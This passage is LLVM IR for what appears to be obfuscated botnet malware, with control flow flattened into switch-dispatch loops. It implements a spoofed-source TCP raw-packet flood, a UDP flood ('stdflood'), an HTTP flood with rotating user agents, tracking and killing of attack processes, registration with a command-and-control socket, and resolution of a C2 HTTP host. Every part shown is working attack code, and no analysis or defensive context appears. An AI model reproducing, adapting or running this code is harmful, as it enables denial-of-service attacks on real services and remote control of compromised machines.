  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i64 @time(i64* null) #6
  %284 = load i32, i32* %8, align 4
  %285 = sext i32 %284 to i64
  %286 = add nsw i64 %283, %285
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -625292857, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 -942321843, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %15, align 4
  %291 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %292 = call i64 @sendto(i32 %290, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = load i32, i32* %17, align 4
  %294 = call i32 @getRandomIP(i32 %293)
  %295 = call i32 @htonl(i32 %294) #9
  %296 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  store i32 %295, i32* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 2
  store i32 %302, i32* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = trunc i32 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 0
  store i16 %308, i16* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon* %314 to %struct.anon.0*
  %316 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %315, i32 0, i32 6
  store i16 0, i16* %316, align 4
  %317 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %318 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %319 = call zeroext i16 @tcpcsum(%struct.iphdr* %317, %struct.tcphdr* %318)
  %320 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 %319, i16* %323, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %324 = bitcast i8* %.reload6 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %23, align 4
  %333 = load i32, i32* %13, align 4
  %334 = icmp eq i32 %332, %333
  %335 = select i1 %334, i32 -981476614, i32 1342613672
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = call i64 @time(i64* null) #6
  %338 = load i32, i32* %22, align 4
  %339 = sext i32 %338 to i64
  %340 = icmp sgt i64 %337, %339
  %341 = select i1 %340, i32 507676968, i32 -2104998856
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 -742437515, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 -625292857, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %23, align 4
  %346 = add i32 %345, 1
  store i32 %346, i32* %23, align 4
  store i32 -625292857, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %348)
  store i32 -378490972, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %347, %344, %343, %342, %336, %289, %288, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %227, %219, %214, %206, %201, %193, %188, %180, %175, %167, %162, %158, %155, %119, %71, %65, %64, %60, %59, %53, %52, %45, %44, %38, %33, %29, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @printf(i8*, ...) #5

; Function Attrs: noinline nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* null) #6
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #6
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  %switchVar = alloca i32
  store i32 -1969195724, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1969195724, label %39
    i32 1866913346, label %43
    i32 1513244722, label %60
    i32 -119565183, label %63
    i32 1443986710, label %64
    i32 73631773, label %67
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  %42 = select i1 %41, i32 1866913346, i32 1443986710
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i8* @makestring()
  store i8* %44, i8** %14, align 8
  %45 = load i32, i32* %9, align 4
  %46 = load i8*, i8** %14, align 8
  %47 = load i32, i32* %8, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @send(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = load i32, i32* %9, align 4
  %51 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 16)
  %53 = call i64 @time(i64* null) #6
  %54 = load i64, i64* %10, align 8
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = add nsw i64 %54, %56
  %58 = icmp sge i64 %53, %57
  %59 = select i1 %58, i32 1513244722, i32 -119565183
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %9, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #11
  unreachable

; <label>:63:                                     ; preds = %loopEntry
  store i32 0, i32* %13, align 4
  store i32 1443986710, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %13, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %13, align 4
  store i32 -1969195724, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %64, %63, %43, %39, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @close(i32) #5

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %5, align 8
  %switchVar = alloca i32
  store i32 -1767492442, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1767492442, label %first
    i32 399766846, label %13
    i32 -2012970609, label %14
    i32 2019694601, label %37
    i32 1817237262, label %38
    i32 1153430149, label %44
    i32 2100693446, label %45
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %11 = icmp eq %struct.hostent* %.reload, null
  %12 = select i1 %11, i32 399766846, i32 -2012970609
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  call void @exit(i32 1) #12
  unreachable

; <label>:14:                                     ; preds = %loopEntry
  %15 = load %struct.hostent*, %struct.hostent** %5, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %5, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #6
  %26 = load i16, i16* %4, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #9
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #6
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast i32* %7 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #6
  %34 = load i32, i32* %8, align 4
  %35 = icmp eq i32 %34, -1
  %36 = select i1 %35, i32 2019694601, i32 1817237262
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %8, align 4
  %40 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %41 = call i32 @connect(i32 %39, %struct.sockaddr* %40, i32 16)
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 1153430149, i32 2100693446
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %8, align 4
  ret i32 %46

loopEnd:                                          ; preds = %38, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

declare void @perror(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #6
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -1176224229, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1176224229, label %24
    i32 -273406926, label %29
    i32 1485249752, label %40
    i32 -597912874, label %46
    i32 1303699883, label %53
    i32 1125350727, label %64
    i32 -179308771, label %65
    i32 -319851244, label %66
    i32 440719523, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 -273406926, i32 440719523
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #6
  %35 = srem i32 %34, 39
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #6
  store i32 1485249752, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %15, align 4
  %42 = sext i32 %41 to i64
  %43 = call i64 @time(i64* null) #6
  %44 = icmp sgt i64 %42, %43
  %45 = select i1 %44, i32 -597912874, i32 -179308771
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %8, align 8
  %48 = load i16, i16* %9, align 2
  %49 = call i32 @socket_connect(i8* %47, i16 zeroext %48)
  store i32 %49, i32* %13, align 4
  %50 = load i32, i32* %13, align 4
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1303699883, i32 1125350727
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #10
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  store i32 1125350727, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 1485249752, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %14, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %14, align 4
  store i32 -1176224229, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %64, %53, %46, %40, %29, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i64 @write(i32, i8*, i64) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 287598013, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 287598013, label %first
    i32 1592751758, label %9
    i32 1500680976, label %11
    i32 1760817293, label %19
    i32 106119865, label %26
    i32 2116224603, label %36
    i32 992972044, label %39
    i32 1023958679, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 1592751758, i32 1500680976
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 1023958679, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numattackpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numattackpids, align 8
  %14 = load i64, i64* @numattackpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #6
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 1760817293, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numattackpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 106119865, i32 992972044
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @attackpids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 2116224603, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 1760817293, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numattackpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @attackpids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #6
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @attackpids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 1023958679, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  %switchVar = alloca i32
  store i32 83944317, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 83944317, label %3
    i32 535354529, label %8
    i32 973662696, label %15
    i32 19579102, label %23
    i32 2090493765, label %31
    i32 1762239730, label %32
    i32 -980372771, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  %7 = select i1 %6, i32 535354529, i32 -980372771
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32*, i32** @attackpids, align 8
  %10 = load i64, i64* %2, align 8
  %11 = getelementptr inbounds i32, i32* %9, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = icmp ne i32 %12, 0
  %14 = select i1 %13, i32 973662696, i32 2090493765
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32*, i32** @attackpids, align 8
  %17 = load i64, i64* %2, align 8
  %18 = getelementptr inbounds i32, i32* %16, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = call i32 @getpid() #6
  %21 = icmp ne i32 %19, %20
  %22 = select i1 %21, i32 19579102, i32 2090493765
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32*, i32** @attackpids, align 8
  %25 = load i64, i64* %2, align 8
  %26 = getelementptr inbounds i32, i32* %24, i64 %25
  %27 = load i32, i32* %26, align 4
  %28 = call i32 @kill(i32 %27, i32 9) #6
  %29 = load i32, i32* %1, align 4
  %30 = add nsw i32 %29, 1
  store i32 %30, i32* %1, align 4
  store i32 2090493765, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 1762239730, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i64, i64* %2, align 8
  %34 = add i64 %33, 1
  store i64 %34, i64* %2, align 8
  store i32 83944317, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %31, %23, %15, %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) #0 {
  %.reg2mem = alloca i64
  %2 = alloca i8*, align 8
  %3 = alloca [100 x i8], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %5 = load i8*, i8** %2, align 8
  %6 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %4, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i32 0, i32 0), i8* %5) #6
  %7 = load i32, i32* @C2, align 4
  %8 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %9 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %10 = call i64 @strlen(i8* %9) #10
  %11 = call i64 @write(i32 %7, i8* %8, i64 %10)
  store i64 %11, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 -1502401483, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1502401483, label %first
    i32 960182407, label %14
    i32 -930836270, label %15
    i32 480969044, label %16
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %12 = icmp ne i64 %.reload, 0
  %13 = select i1 %12, i32 960182407, i32 -930836270
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 480969044, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 480969044, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() #0 {
  %.reg2mem = alloca %struct.hostent*
  %1 = alloca i32, align 4
  %2 = alloca %struct.hostent*, align 8
  %3 = alloca %struct.in_addr**, align 8
  %4 = alloca i32, align 4
  %5 = load i8*, i8** @c2_http_host, align 8
  %6 = call %struct.hostent* @gethostbyname(i8* %5)
  store %struct.hostent* %6, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %2, align 8
  %switchVar = alloca i32
  store i32 884129312, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 884129312, label %first
    i32 473132955, label %9
    i32 -719779970, label %10
    i32 -2010075920, label %15
    i32 127264362, label %23
    i32 2119595204, label %33
    i32 992731619, label %36
    i32 -336233537, label %37
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %7 = icmp eq %struct.hostent* %.reload, null
  %8 = select i1 %7, i32 473132955, i32 -719779970
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  store i32 1, i32* %1, align 4
  store i32 -336233537, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load %struct.hostent*, %struct.hostent** %2, align 8
  %12 = getelementptr inbounds %struct.hostent, %struct.hostent* %11, i32 0, i32 4
  %13 = load i8**, i8*** %12, align 8
  %14 = bitcast i8** %13 to %struct.in_addr**
  store %struct.in_addr** %14, %struct.in_addr*** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -2010075920, i32* %switchVar
  br label %loopEnd

